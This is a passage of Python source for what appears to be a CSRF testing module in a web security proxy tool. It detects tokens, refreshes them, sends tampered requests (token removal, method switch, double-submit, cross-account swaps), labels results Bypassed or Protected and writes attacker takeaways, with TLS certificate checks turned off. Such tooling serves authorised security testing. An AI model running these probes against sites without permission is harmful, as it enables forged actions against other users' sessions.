            summary = "⚠️  No CSRF tokens detected automatically. Add them manually below."
            color   = COLOR_HIGH
        else:
            parts = []
            if n_body:   parts.append(f"{n_body} body param(s)")
            if n_cookie: parts.append(f"{n_cookie} cookie token(s)")
            if n_hdr:    parts.append(f"{n_hdr} header token(s)")
            summary = f"✓ Detected: {', '.join(parts)}."
            all_vals = [v for _, v in self._body_tokens + self._header_tokens + self._cookie_tokens]
            if n_total >= 2 and len(set(all_vals)) == 1 and all_vals[0]:
                summary += "  Same value in all locations → double-submit pattern suspected."
            color = COLOR_SUCCESS
        self._token_summary.setText(summary)
        self._token_summary.setStyleSheet(f"color:{color};font-size:8pt;")

        # Body tokens
        self._body_tok_table.setRowCount(0)
        for param, val in self._body_tokens:
            r = self._body_tok_table.rowCount()
            self._body_tok_table.insertRow(r)
            self._body_tok_table.setItem(r, 0, QTableWidgetItem(param))
            self._body_tok_table.setItem(r, 1, QTableWidgetItem(val))
            fmt = "JSON" if ri.body and ri.body.strip().startswith("{") else "URL-encoded"
            loc_item = QTableWidgetItem(fmt)
            loc_item.setFlags(loc_item.flags() & ~Qt.ItemIsEditable)
            self._body_tok_table.setItem(r, 2, loc_item)

        # Cookie tokens
        self._cookie_tok_table.setRowCount(0)
        for ck_name, ck_val in self._cookie_tokens:
            r = self._cookie_tok_table.rowCount()
            self._cookie_tok_table.insertRow(r)
            self._cookie_tok_table.setItem(r, 0, QTableWidgetItem(ck_name))
            self._cookie_tok_table.setItem(r, 1, QTableWidgetItem(ck_val))

        # Header tokens
        self._hdr_tok_table.setRowCount(0)
        for hdr, val in self._header_tokens:
            r = self._hdr_tok_table.rowCount()
            self._hdr_tok_table.insertRow(r)
            self._hdr_tok_table.setItem(r, 0, QTableWidgetItem(hdr))
            self._hdr_tok_table.setItem(r, 1, QTableWidgetItem(val))

    def _add_body_token(self):
        r = self._body_tok_table.rowCount()
        self._body_tok_table.insertRow(r)
        self._body_tok_table.setItem(r, 0, QTableWidgetItem("csrf"))
        self._body_tok_table.setItem(r, 1, QTableWidgetItem(""))
        self._body_tok_table.setItem(r, 2, QTableWidgetItem("URL-encoded"))
        self._body_tok_table.editItem(self._body_tok_table.item(r, 0))
        self._refresh_probe_matrix()

    def _add_cookie_token(self):
        r = self._cookie_tok_table.rowCount()
        self._cookie_tok_table.insertRow(r)
        self._cookie_tok_table.setItem(r, 0, QTableWidgetItem("csrfKey"))
        self._cookie_tok_table.setItem(r, 1, QTableWidgetItem(""))
        self._cookie_tok_table.editItem(self._cookie_tok_table.item(r, 0))
        self._refresh_probe_matrix()

    def _add_header_token(self):
        r = self._hdr_tok_table.rowCount()
        self._hdr_tok_table.insertRow(r)
        self._hdr_tok_table.setItem(r, 0, QTableWidgetItem("X-CSRF-Token"))
        self._hdr_tok_table.setItem(r, 1, QTableWidgetItem(""))
        self._hdr_tok_table.editItem(self._hdr_tok_table.item(r, 0))
        self._refresh_probe_matrix()

    def _del_row(self, table: QTableWidget):
        rows = sorted({i.row() for i in table.selectedItems()}, reverse=True)
        for r in rows:
            table.removeRow(r)
        self._refresh_probe_matrix()

    # ── Current config extraction ──────────────────────────────────────

    def _get_body_tokens(self) -> List[Tuple[str, str]]:
        result = []
        for r in range(self._body_tok_table.rowCount()):
            k = (self._body_tok_table.item(r, 0) or QTableWidgetItem("")).text().strip()
            v = (self._body_tok_table.item(r, 1) or QTableWidgetItem("")).text().strip()
            if k:
                result.append((k, v))
        return result

    def _get_cookie_tokens(self) -> List[Tuple[str, str]]:
        result = []
        for r in range(self._cookie_tok_table.rowCount()):
            k = (self._cookie_tok_table.item(r, 0) or QTableWidgetItem("")).text().strip()
            v = (self._cookie_tok_table.item(r, 1) or QTableWidgetItem("")).text().strip()
            if k:
                result.append((k, v))
        return result

    def _get_hdr_tokens(self) -> List[Tuple[str, str]]:
        result = []
        for r in range(self._hdr_tok_table.rowCount()):
            k = (self._hdr_tok_table.item(r, 0) or QTableWidgetItem("")).text().strip()
            v = (self._hdr_tok_table.item(r, 1) or QTableWidgetItem("")).text().strip()
            if k:
                result.append((k, v))
        return result

    def _on_refresh_mode_changed(self, mode: str):
        hints = {
            "HTML form input": (
                "Enter the input name to extract. "
                "Example: csrf  →  extracts value from <input name=\"csrf\" value=\"TOKEN\">. "
                "Leave empty to auto-detect the first CSRF-looking hidden input."),
            "JSON key":  (
                "Enter the JSON key whose value is the token. "
                "Example: csrf_token  →  extracts from {\"csrf_token\": \"TOKEN\", ...}. "
                "Supports dot notation for nested keys: data.token"),
            "Cookie name": (
                "Enter the cookie name to extract from the Set-Cookie response header. "
                "Example: csrf  →  extracts from Set-Cookie: csrf=TOKEN; Path=/"),
            "Regex (response)": (
                "Enter a Python regex with one capture group. "
                "Example: name=\"csrf\" value=\"([^\"]+)\"  →  captures the token value."),
        }
        self._refresh_mode_hint.setText(hints.get(mode, ""))
        # Auto-populate pattern based on detected body tokens
        if not self._refresh_pattern.text().strip():
            if mode == "HTML form input" and self._body_tokens:
                self._refresh_pattern.setPlaceholderText(self._body_tokens[0][0])
            elif mode == "JSON key" and self._body_tokens:
                self._refresh_pattern.setPlaceholderText(self._body_tokens[0][0])
            elif mode == "Cookie name" and self._cookie_tokens:
                self._refresh_pattern.setPlaceholderText(self._cookie_tokens[0][0])
            else:
                self._refresh_pattern.setPlaceholderText("")

    @pyqtSlot(str, str)
    def _on_refresh_result(self, msg: str, color: str):
        """Slot — always runs in the main thread via signal delivery."""
        self._refresh_result_lbl.setText(msg)
        self._refresh_result_lbl.setStyleSheet(
            f"color:{color};font-size:8pt;font-family:Consolas;")

    def _test_refresh(self):
        """Fetch the refresh URL and show what token would be extracted."""
        url = self._refresh_url.text().strip()
        if not url:
            self._refresh_result_lbl.setText("⚠️  No refresh URL entered.")
            self._refresh_result_lbl.setStyleSheet(f"color:{COLOR_HIGH};font-size:8pt;")
            return
        mode    = self._refresh_mode.currentText()
        pattern = self._refresh_pattern.text().strip()
        self._refresh_result_lbl.setText("🔄 Fetching…")
        self._refresh_result_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        QApplication.processEvents()

        # Run fetch in a background thread; emit signal (thread-safe) when done
        import threading, gzip as _gzip
        def _fetch():
            try:
                req = urllib.request.Request(url)
                # Forward Cookie header from the original request
                for k, v in self.request_info.headers.items():
                    if k.lower() == "cookie":
                        req.add_unredirected_header("Cookie", v)
                # Also forward common headers so the server recognises the session
                for k, v in self.request_info.headers.items():
                    lk = k.lower()
                    if lk in ("user-agent", "accept", "accept-language"):
                        req.add_header(k, v)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
                    raw_body = resp.read()
                    enc = resp.headers.get("Content-Encoding", "")
                    if enc == "gzip":
                        raw_body = _gzip.decompress(raw_body)
                    elif enc == "deflate":
                        import zlib
                        raw_body = zlib.decompress(raw_body)
                    body_str   = raw_body.decode("utf-8", errors="replace")
                    set_cookie = resp.headers.get("Set-Cookie", "")
                    token = CSRFAnalysisDialog._extract_token(
                        body_str, set_cookie, mode, pattern)
                    if token:
                        msg   = f"✓ Extracted token: {token[:80]}{'…' if len(token)>80 else ''}"
                        color = COLOR_SUCCESS
                    else:
                        # Show a snippet of the response body for diagnostics
                        snippet = body_str[:200].replace("\n", " ").strip()
                        msg   = (f"⚠️  No token found. Mode={mode!r}  Pattern={pattern!r}\n"
                                 f"Response snippet: {snippet}")
                        color = COLOR_HIGH
            except Exception as exc:
                msg   = f"✗ {type(exc).__name__}: {exc}"
                color = COLOR_CRITICAL
            # Signal is thread-safe; slot runs in the main thread
            self._refresh_done.emit(msg, color)

        threading.Thread(target=_fetch, daemon=True).start()

    @staticmethod
    def _extract_token(body: str, set_cookie: str, mode: str, pattern: str) -> str:
        """Extract a CSRF token from a response body/headers using the chosen mode."""
        import html as _html
        if mode == "HTML form input":
            # Parse <input type="hidden" name="csrf" value="TOKEN">
            name = pattern.strip() if pattern else None
            for m in re.finditer(
                    r'<input[^>]+>', body, re.IGNORECASE):
                tag = m.group(0)
                # Get name and value attributes
                nm = re.search(r'name=["\']?([^"\'>\s]+)', tag, re.IGNORECASE)
                vl = re.search(r'value=["\']?([^"\'>\s]*)', tag, re.IGNORECASE)
                if nm and vl:
                    tok_name = _html.unescape(nm.group(1))
                    tok_val  = _html.unescape(vl.group(1))
                    if name:
                        if tok_name.lower() == name.lower():
                            return tok_val
                    elif CSRFGenerator._is_csrf_token_key(tok_name):
                        return tok_val
            return ""

        elif mode == "JSON key":
            try:
                data = json.loads(body)
                if not pattern:
                    # Auto: return first csrf-named key
                    for k, v in data.items():
                        if CSRFGenerator._is_csrf_token_key(k):
                            return str(v)
                    return ""
                # Support dot-notation: "data.token"
                parts = pattern.split(".")
                node = data
                for p in parts:
                    node = node[p]
                return str(node)
            except Exception:
                return ""

        elif mode == "Cookie name":
            # Parse Set-Cookie header
            name = pattern.strip()
            for part in set_cookie.split(";"):
                part = part.strip()
                if "=" in part:
                    k, v = part.split("=", 1)
                    if k.strip().lower() == name.lower():
                        return v.strip()
            return ""

        elif mode == "Regex (response)":
            if not pattern:
                return ""
            m = re.search(pattern, body)
            return m.group(1) if m and m.lastindex else ""

        return ""

    def _refresh_probe_matrix(self):
        body_tokens   = self._get_body_tokens()
        cookie_tokens = self._get_cookie_tokens()
        hdr_tokens    = self._get_hdr_tokens()
        has_refresh   = bool(self._refresh_url.text().strip())
        acct_b_raw    = self._acct_b_cookie_hdr.text().strip()
        has_acct_b    = bool(acct_b_raw)
        double_sub    = self._double_submit_chk.isChecked()

        lines = []
        def add(icon, name, desc=""):
            lines.append(f"  {icon}  {name}" + (f"\n       {desc}" if desc else ""))

        add("🔵", "Baseline (valid request)", "Reference — all probes compared against this")

        if has_refresh:
            add("🔄", "Baseline + refreshed token", "Verify token refresh works before probing")

        for name, _ in body_tokens:
            add("🔴", f"Body '{name}' — invalid value",    "Random string replaces token value")
            add("🟡", f"Body '{name}' — empty value",      "Token parameter set to empty string")
            add("🟠", f"Body '{name}' — parameter absent", "Token parameter removed entirely")

        for name, _ in cookie_tokens:
            add("🔴", f"Cookie '{name}' — invalid value",  "Cookie token set to random string")
            add("🟠", f"Cookie '{name}' — cookie absent",  "Cookie token removed from Cookie header")

        for name, _ in hdr_tokens:
            add("🔴", f"Header '{name}' — invalid value",  "Header token set to random string")
            add("🟠", f"Header '{name}' — header absent",  "Header removed entirely")

        if self.request_info.method == "POST":
            add("🔁", "GET method switch",
                "POST→GET, all params in query string — tests method-based token skip")

        add("🔐", "Session cookie removed",
            "Keep all CSRF tokens, remove only session — confirms token-session binding")

        if double_sub and (body_tokens or cookie_tokens or hdr_tokens):
            add("🎭", "Double-submit: all token locations set to same fake value",
                "Body + cookie + header tokens all set to 'fake' simultaneously")
            if len(body_tokens) >= 2:
                add("🎭", "Double-submit: body tokens set to different fake values",
                    "Test whether ALL body tokens must match or only one")

        if has_acct_b:
            add("🔀", "Account A token + Account B session",
                "Cross-account swap — A's token (auto-refreshed) + B's session")
            add("🔀", "Account B token + Account A session",
                "Reverse swap — B's token (auto-refreshed from B's URL) + A's session")
            add("🔵", "Account B token + Account B session (B baseline)",
                "B tokens auto-refreshed from B's URL — sanity check")
            add("🔴", "Invalid token + Account B session",
                "Confirm Account B also validates tokens")
            add("🔀", "Refreshed A token + Account B session",
                "Fresh A token (auto-refreshed) with B's session — tests session-token binding")
            if double_sub:
                add("🎭", "Account B: double-submit with B's own tokens (auto-refreshed)",
                    "Confirm double-submit vulnerability affects Account B too")

        if not body_tokens and not cookie_tokens and not hdr_tokens:
            lines.append("⚠️  No tokens configured")

        count = len(lines)
        # Update the probe count label in the button bar
        summary = f"~{count} probe(s) will run"
        if not body_tokens and not cookie_tokens and not hdr_tokens:
            summary = "⚠️  No tokens — only structural probes"
        if hasattr(self, '_probe_count_lbl'):
            self._probe_count_lbl.setText(summary)

    # ── Body params variation ──────────────────────────────────────────

    def _populate_body_params_table(self):
        """Fill the Body Params table from the request body (auto-detect all params)."""
        ri = self.request_info
        self._body_params_table.setRowCount(0)
        if not ri.body:
            return
        csrf_names = {k.lower() for k, _ in self._body_tokens}
        params: List[Tuple[str, str]] = []
        try:
            data = json.loads(ri.body)
            if isinstance(data, dict):
                params = [(k, str(v)) for k, v in data.items()]
        except (json.JSONDecodeError, ValueError):
            params = urllib.parse.parse_qsl(ri.body, keep_blank_values=True)
        for name, val in params:
            self._add_body_param_row(name, val, checked=name.lower() not in csrf_names)

    def _add_body_param_row(self, name: str = "", val: str = "", checked: bool = True):
        """Insert one row into the Body Params table."""
        row = self._body_params_table.rowCount()
        self._body_params_table.insertRow(row)
        # Column 0: centred checkbox
        chk = QCheckBox()
        chk.setChecked(checked)
        w = QWidget()
        lay = QHBoxLayout(w)
        lay.addWidget(chk)
        lay.setAlignment(Qt.AlignCenter)
        lay.setContentsMargins(0, 0, 0, 0)
        self._body_params_table.setCellWidget(row, 0, w)
        self._body_params_table.setItem(row, 1, QTableWidgetItem(name))
        self._body_params_table.setItem(row, 2, QTableWidgetItem(val))
        self._body_params_table.setItem(row, 3, QTableWidgetItem(""))

    def _get_body_variation(self) -> Dict:
        """Return the body variation config dict from the Body Params tab."""
        if not self._vary_body_chk.isChecked():
            return {}
        use_list = self._vary_strategy.currentIndex() == 1
        result: Dict = {}
        tbl = self._body_params_table
        for row in range(tbl.rowCount()):
            w = tbl.cellWidget(row, 0)
            chk = w.findChild(QCheckBox) if w else None
            if not chk or not chk.isChecked():
                continue
            name_item = tbl.item(row, 1)
            base_item = tbl.item(row, 2)
            vals_item = tbl.item(row, 3)
            name = name_item.text().strip() if name_item else ""
            base = base_item.text().strip() if base_item else ""
            vals_str = vals_item.text().strip() if vals_item else ""
            if not name:
                continue
            if use_list:
                vals = [v.strip() for v in vals_str.split(",") if v.strip()]
                result[name] = {"mode": "list", "base": base, "values": vals or [base]}
            else:
                result[name] = {"mode": "increment", "base": base}
        return result

    # ── Launch ─────────────────────────────────────────────────────────

    def _launch_tester(self):
        config = dict(
            body_tokens        = self._get_body_tokens(),
            cookie_tokens      = self._get_cookie_tokens(),
            hdr_tokens         = self._get_hdr_tokens(),
            refresh_url        = self._refresh_url.text().strip(),
            refresh_mode       = self._refresh_mode.currentText(),
            refresh_pattern    = self._refresh_pattern.text().strip(),
            acct_b_cookie_hdr  = self._acct_b_cookie_hdr.text().strip(),
            acct_b_refresh_url = self._acct_b_refresh_url.text().strip(),
            double_submit      = self._double_submit_chk.isChecked(),
            body_variation     = self._get_body_variation(),
        )
        # Close any previously opened tester before launching a new one
        if hasattr(self, "_tester_dlg") and self._tester_dlg is not None:
            try:
                self._tester_dlg.close()
            except RuntimeError:
                pass   # already destroyed
            self._tester_dlg = None
        dlg = CSRFTesterDialog(
            self.request_info, self.raw_request,
            config=config, parent=self.parent())
        dlg.setAttribute(Qt.WA_DeleteOnClose)
        dlg._config_dlg = self   # let tester hold a ref back to us
        dlg.show()
        self._tester_dlg = dlg   # keep reference so we are not GC'd
        self.hide()               # hide config dialog while tester is running

    # ── Config restore (pre-fill from a previous run) ──────────────────

    def _restore_config(self, cfg: Dict) -> None:
        """Re-apply a previous config dict to the UI fields after _build_ui."""
        if cfg.get("refresh_url"):
            self._refresh_url.setText(cfg["refresh_url"])
        if cfg.get("refresh_mode"):
            self._refresh_mode.setCurrentText(cfg["refresh_mode"])
        if cfg.get("refresh_pattern"):
            self._refresh_pattern.setText(cfg["refresh_pattern"])
        if cfg.get("acct_b_cookie_hdr"):
            self._acct_b_cookie_hdr.setText(cfg["acct_b_cookie_hdr"])
        if cfg.get("acct_b_refresh_url"):
            self._acct_b_refresh_url.setText(cfg["acct_b_refresh_url"])
        self._double_submit_chk.setChecked(bool(cfg.get("double_submit", False)))


# ─────────────────────────────────────────────────────────────────────────────
# CSRF Mechanism Tester
# ─────────────────────────────────────────────────────────────────────────────

class CSRFProbe:
    """Represents a single test probe with its result."""
    def __init__(self, name: str, description: str,
                 raw_request: str, bypass_hint: str = "",
                 refresh_body: Optional[List[str]] = None,
                 refresh_cookies: Optional[List[str]] = None,
                 refresh_hdrs: Optional[List[str]] = None,
                 use_acct_b_refresh: bool = False):
        self.name        = name
        self.description = description
        self.raw_request = raw_request
        self.bypass_hint = bypass_hint   # which bypass to suggest if this probe succeeds
        # Token refresh directives – set during probe construction
        self.refresh_body    = refresh_body or []     # body param names to inject fresh token
        self.refresh_cookies = refresh_cookies or []  # cookie names to inject fresh token
        self.refresh_hdrs    = refresh_hdrs or []     # header names to inject fresh token
        self.use_acct_b_refresh = use_acct_b_refresh  # use Account B's refresh URL/cookies
        # Results filled in after send
        self.status_code : int  = 0
        self.status_text : str  = ""
        self.response_headers: str = ""
        self.response_body   : str = ""
        self.result_label    : str = "Pending"   # "Protected" | "Bypassed" | "Error"
        self.error           : str = ""
        # Human-readable relationship analysis computed after result is known
        self.analysis_note   : str = ""   # e.g. "csrfKey linked to body token but not to session"
        self.exploit_action  : str = ""   # e.g. "use own csrfKey+token in PoC against any session"


class CSRFTesterWorker(QThread):
    """Runs the probe sequence in a background thread, emitting per-probe signals."""

    probe_started  = pyqtSignal(int)                    # probe index
    probe_finished = pyqtSignal(int, object)            # probe index, CSRFProbe
    all_done       = pyqtSignal()

    def __init__(self, probes: List[CSRFProbe],
                 host: str, port: int, use_ssl: bool,
                 refresh_cfg: Optional[Dict] = None,
                 parent=None):
        super().__init__(parent)
        self.probes      = probes
        self.host        = host
        self.port        = port
        self.use_ssl     = use_ssl
        self._refresh_cfg = refresh_cfg or {}

    def _send(self, raw: str) -> Tuple[int, str, str, str]:
        """Send a raw HTTP request, return (status_code, status_text, headers, body)."""
        import gzip, zlib
        try:
            sock = socket.create_connection((self.host, self.port), timeout=10)
            if self.use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self.host)

            # ── Normalize request (same logic as Repeater) ────────────────
            # Split headers from body first so we can manipulate them safely
            if "\r\n\r\n" in raw:
                header_part, body_part = raw.split("\r\n\r\n", 1)
            elif "\n\n" in raw:
                header_part, body_part = raw.split("\n\n", 1)
            else:
                header_part, body_part = raw, ""

            header_lines = header_part.strip().splitlines()
            if header_lines:
                # Downgrade HTTP/2 to HTTP/1.1 so raw sockets work
                if "HTTP/2" in header_lines[0]:
                    import re as _re
                    header_lines[0] = _re.sub(r'HTTP/2(?:\.0)?', 'HTTP/1.1', header_lines[0])

                body_bytes = body_part.encode("utf-8", errors="replace")
                body_len   = len(body_bytes)
                has_connection     = False
                has_content_length = False

                for i in range(1, len(header_lines)):
                    line_lower = header_lines[i].lower()
                    if line_lower.startswith("connection:"):
                        header_lines[i] = "Connection: close"
                        has_connection = True
                    elif line_lower.startswith("content-length:"):
                        key = header_lines[i].split(":", 1)[0]
                        header_lines[i] = f"{key}: {body_len}"
                        has_content_length = True

                if not has_connection:
                    header_lines.append("Connection: close")

                method = header_lines[0].split()[0].upper() if header_lines else ""
                if not has_content_length and (method in ("POST", "PUT", "PATCH") or body_len > 0):
                    header_lines.append(f"Content-Length: {body_len}")

            normalized = "\r\n".join(header_lines) + "\r\n\r\n" + body_part
            sock.sendall(normalized.encode("utf-8", errors="replace"))
            sock.settimeout(10)

            buf = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    buf += chunk
                    if len(buf) > 512_000:
                        break
            except (socket.timeout, OSError):
                pass
            sock.close()

            # Split headers from body at the first blank line (raw bytes)
            if b"\r\n\r\n" in buf:
                head_bytes, body_bytes = buf.split(b"\r\n\r\n", 1)
            elif b"\n\n" in buf:
                head_bytes, body_bytes = buf.split(b"\n\n", 1)
            else:
                head_bytes, body_bytes = buf, b""

            head_text = head_bytes.decode("utf-8", errors="replace")
            lines = head_text.splitlines()
            status_line = lines[0] if lines else ""
            parts = status_line.split(" ", 2)
            code   = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
            reason = parts[2] if len(parts) >= 3 else ""
            headers = "\n".join(lines[1:])

            # Decompress body if Content-Encoding says gzip/deflate
            encoding = ""
            for line in lines[1:]:
                if line.lower().startswith("content-encoding:"):
                    encoding = line.split(":", 1)[1].strip().lower()
                    break
            try:
                if encoding == "gzip":
                    body_bytes = gzip.decompress(body_bytes)
                elif encoding in ("deflate", "zlib"):
                    body_bytes = zlib.decompress(body_bytes)
            except Exception:
                pass  # leave as-is if decompression fails

            body = body_bytes.decode("utf-8", errors="replace")
            return code, reason, headers, body[:8192]

        except Exception as exc:
            return 0, "", "", f"[Connection error: {exc}]"

    @staticmethod
    def _location_from_headers(headers: str) -> str:
        """Extract the Location header value (lower-cased path only) or ''."""
        for line in headers.splitlines():
            if line.lower().startswith("location:"):
                return line.split(":", 1)[1].strip()
        return ""

    def _fetch_fresh_token(self, use_acct_b: bool = False) -> Optional[str]:
        """Fetch the refresh URL and return a fresh CSRF token, or None."""
        cfg = self._refresh_cfg
        if use_acct_b:
            # Use Account B's own refresh URL if provided, otherwise fall back to Account A's
            url     = cfg.get("acct_b_refresh_url", "") or cfg.get("refresh_url", "")
            cookies = cfg.get("acct_b_cookie_hdr", "")
        else:
            url     = cfg.get("refresh_url", "")
            cookies = cfg.get("a_cookie_hdr", "")
        if not url:
            return None
        mode    = cfg.get("refresh_mode", "HTML form input")
        pattern = cfg.get("refresh_pattern", "")
        import gzip as _gzip
        try:
            req = urllib.request.Request(url)
            if cookies:
                req.add_header("Cookie", cookies)
            req.add_header("User-Agent", "Mozilla/5.0")
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                body = resp.read()
                if resp.headers.get("Content-Encoding", "") == "gzip":
                    body = _gzip.decompress(body)
                body_str   = body.decode("utf-8", errors="replace")
                set_cookie = resp.headers.get("Set-Cookie", "")
                return CSRFAnalysisDialog._extract_token(body_str, set_cookie, mode, pattern)
        except Exception:
            return None

    @staticmethod
    def _inject_fresh_token(raw: str, fresh_token: str,
                            body_params: List[str],
                            cookie_names: List[str],
                            hdr_names: List[str]) -> str:
        """Replace CSRF token values in a raw HTTP request with a fresh token."""
        parsed  = _parse_raw_request(raw)
        headers = dict(parsed["headers"])
        body    = parsed["body"]
        method  = parsed["method"]
        path    = parsed["path"]

        # ── Replace in URL query params (e.g. GET method-switch probe) ────
        if body_params and "?" in path:
            base_path, qs = path.split("?", 1)
            try:
                qs_params  = urllib.parse.parse_qsl(qs, keep_blank_values=True)
                new_qs     = []
                replaced_qs = False
                for k, v in qs_params:
                    if k in body_params:
                        new_qs.append((k, fresh_token))
                        replaced_qs = True
                    else:
                        new_qs.append((k, v))
                if replaced_qs:
                    path = base_path + "?" + urllib.parse.urlencode(new_qs)
            except Exception:
                pass

        # ── Replace in body ───────────────────────────────────────────────
        if body_params and body:
            replaced_any = False
            # Try URL-encoded
            try:
                params    = urllib.parse.parse_qsl(body, keep_blank_values=True)
                new_params = []
                for k, v in params:
                    if k in body_params:
                        new_params.append((k, fresh_token))
                        replaced_any = True
                    else:
                        new_params.append((k, v))
                if replaced_any:
                    body = urllib.parse.urlencode(new_params)
            except Exception:
                pass
            if not replaced_any:
                # Try JSON body
                try:
                    data = json.loads(body)
                    if isinstance(data, dict):
                        for k in body_params:
                            if k in data:
                                data[k] = fresh_token
                                replaced_any = True
                        if replaced_any:
                            body = json.dumps(data)
                except Exception:
                    pass

        # ── Replace in Cookie header ──────────────────────────────────────
        if cookie_names:
            for hk in list(headers.keys()):
                if hk.lower() == "cookie":
                    parts     = [p.strip() for p in headers[hk].split(";")]
                    new_parts = []
                    for part in parts:
                        if "=" in part:
                            ck, cv = part.split("=", 1)
                            if ck.strip() in cookie_names:
                                new_parts.append(f"{ck.strip()}={fresh_token}")
                            else:
                                new_parts.append(part)
                        else:
                            new_parts.append(part)
                    headers[hk] = "; ".join(p for p in new_parts if p)

        # ── Replace in custom request headers ─────────────────────────────
        if hdr_names:
            hdr_names_lower = [h.lower() for h in hdr_names]
            for hk in list(headers.keys()):
                if hk.lower() in hdr_names_lower:
                    headers[hk] = fresh_token

        # ── Update Content-Length if needed ───────────────────────────────
        if body:
            for k in list(headers):
                if k.lower() == "content-length":
                    headers[k] = str(len(body.encode("utf-8")))

        lines = [f"{method} {path} HTTP/1.1"]
        for k, v in headers.items():
            lines.append(f"{k}: {v}")
        lines.append("")
        lines.append(body or "")
        return "\n".join(lines)

    @staticmethod
    def _apply_body_variation(raw: str, probe_idx: int, strategies: Dict) -> str:
        """Vary non-CSRF body params per probe according to the configured strategy."""
        if not strategies:
            return raw
        parsed  = _parse_raw_request(raw)
        body    = parsed["body"]
        if not body:
            return raw
        headers = dict(parsed["headers"])
        method  = parsed["method"]
        path    = parsed["path"]
        replaced = False

        # ── URL-encoded body ──────────────────────────────────────────────
        try:
            params = urllib.parse.parse_qsl(body, keep_blank_values=True)
            if params:   # non-empty list means it parsed as form data
                new_params = []
                for k, v in params:
                    if k in strategies:
                        strat = strategies[k]
                        mode  = strat.get("mode", "increment")
                        if mode == "increment":
                            v = strat.get("base", v) + str(probe_idx + 1)
                        elif mode == "list":
                            vals = strat.get("values", [])
                            if vals:
                                v = vals[probe_idx % len(vals)]
                        replaced = True
                    new_params.append((k, v))
                if replaced:
                    body = urllib.parse.urlencode(new_params)
        except Exception:
            pass

        # ── JSON body ─────────────────────────────────────────────────────
        if not replaced:
            try:
                data = json.loads(body)
                if isinstance(data, dict):
                    for k in list(data.keys()):
                        if k in strategies:
                            strat = strategies[k]
                            mode  = strat.get("mode", "increment")
                            cur   = str(data[k])
                            if mode == "increment":
                                data[k] = strat.get("base", cur) + str(probe_idx + 1)
                            elif mode == "list":
                                vals = strat.get("values", [])
                                if vals:
                                    data[k] = vals[probe_idx % len(vals)]
                            replaced = True
                    if replaced:
                        body = json.dumps(data)
            except Exception:
                pass

        if not replaced:
            return raw

        # Update Content-Length
        for k in list(headers):
            if k.lower() == "content-length":
                headers[k] = str(len(body.encode("utf-8")))

        lines = [f"{method} {path} HTTP/1.1"]
        for k, v in headers.items():
            lines.append(f"{k}: {v}")
        lines.append("")
        lines.append(body)
        return "\n".join(lines)

    # Response body patterns that strongly indicate server-side rejection even with 2xx
    _BODY_REJECTION_PATTERNS = [
        '"success":false', '"success": false',
        '"success":"false"', '"success": "false"',
        '"error":true', '"error": true',
        '"status":"error"', '"status": "error"',
        '"status":"fail"', '"status": "fail"',
        '"ok":false', '"ok": false',
        'invalid csrf token', 'invalid csrftoken', 'csrf token invalid',
        'csrf validation failed', 'csrf check failed', 'csrf mismatch',
        'invalid token', 'token is invalid', 'token expired',
        'token not found', 'missing token', 'bad token',
        '"forbidden"', 'access denied', 'not authorized',
        'authorization failed', 'session expired', 'invalid session',
    ]

    def _is_success_like(self, probe: CSRFProbe, baseline: CSRFProbe) -> bool:
        """Return True if this probe's response looks like a genuine success.

        Rules (applied in order):
        1. Explicit HTTP error codes → always Protected.
        2. 401 Unauthorized → Protected (authentication required).
        3. Redirects: compare Location to baseline — different destination = not bypass.
        4. Body-based rejection: JSON APIs often return 200 with error payload;
           detect rejection keywords and downgrade to not-a-bypass.
        5. Status code match with baseline → Bypassed.
        """
        code      = probe.status_code
        base_code = baseline.status_code

        # Explicit rejection codes → always Protected
        if code in (400, 401, 403, 405, 422, 500, 501):
            return False

        # Connection/parse error
        if code == 0:
            return False

        # For redirects, compare Location header to baseline
        if 300 <= code < 400:
            probe_loc = self._location_from_headers(probe.response_headers)
            base_loc  = self._location_from_headers(baseline.response_headers)
            if not probe_loc:
                # No Location — inconclusive, treat as not bypassed
                return False
            if base_loc and probe_loc != base_loc:
                # Different redirect destination (e.g. /login vs /my-account) → not bypassed
                return False
            return True

        # 2xx responses: check body for JSON/text rejection signals
        # (APIs that always return 200 but signal errors in the payload)
        if 200 <= code < 300 and probe.response_body:
            body_lower = probe.response_body.lower()
            if any(pat in body_lower for pat in self._BODY_REJECTION_PATTERNS):
                return False

        # 2xx with same code as baseline → success
        if code == base_code:
            return True

        # Any 2xx when baseline was also 2xx
        if 200 <= code < 300 and 200 <= base_code < 300:
            return True

        return False

    @staticmethod
    def _compute_probe_analysis(probe: "CSRFProbe") -> Tuple[str, str]:
        """Return (analysis_note, exploit_action) for a completed probe.

        analysis_note describes the token relationship revealed by this result.
        exploit_action is the one-line attacker takeaway.
        Both are empty for Baseline / Pending / Error probes.
        """
        name   = probe.name.lower()
        result = probe.result_label

        if result in ("Baseline", "Pending", "Error"):
            return "", ""

        # ── Cross-account session-binding probes ──────────────────────────────

        if "a csrfkey" in name and "b session" in name and "a body token" in name:
            if result == "Bypassed":
                return (
                    "csrfKey is linked to body token (both from same account), "
                    "but NEITHER csrfKey nor body token is tied to the session cookie.",
                    "Use your own account's csrfKey + body token in a PoC "
                    "to exploit CSRF against any victim's session.",
                )
            elif result == "Protected":
                return (
                    "csrfKey IS bound to the session: A's csrfKey was rejected with B's session.",
                    "csrfKey–session binding is enforced — this attack vector is closed.",
                )

        if "b csrfkey" in name and "a session" in name and "a body token" in name:
            if result == "Bypassed":
                return (
                    "csrfKey is not session-scoped in either direction: "
                    "B's csrfKey accepted with A's session and A's body token.",
                    "Any account's csrfKey can be paired with any session — "
                    "binding is completely absent.",
                )
            elif result == "Protected":
                return (
                    "csrfKey–session binding confirmed in reverse too: B's csrfKey rejected with A's session.",
                    "csrfKey is correctly scoped to its issuing session.",
                )

        if "b csrfkey" in name and "b session" in name and "b body token" in name:
            if result == "Bypassed":
                return (
                    "Sanity check: Account B's own complete token set accepted (expected).",
                    "",
                )
            elif result == "Protected":
                return (
